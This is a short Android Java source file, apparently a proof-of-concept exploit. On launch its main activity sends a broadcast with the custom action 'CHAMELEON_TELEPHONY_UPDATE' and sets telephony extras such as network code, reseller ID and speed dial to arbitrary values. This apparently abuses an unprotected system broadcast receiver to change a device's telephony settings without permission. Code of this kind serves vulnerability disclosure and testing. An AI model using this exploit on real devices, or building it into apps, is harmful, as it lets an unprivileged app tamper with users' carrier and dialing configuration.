package poc.app;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;

public class MainActivity extends Activity {
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent i = new Intent("android.intent.action.CHAMELEON_TELEPHONY_UPDATE");
        i.putExtra("brandalpha", "133737");
        i.putExtra("networkcode", "133737");
        i.putExtra("resellerid", "133737");
        i.putExtra("speeddial", "133737");
        sendBroadcast(i);
    }
}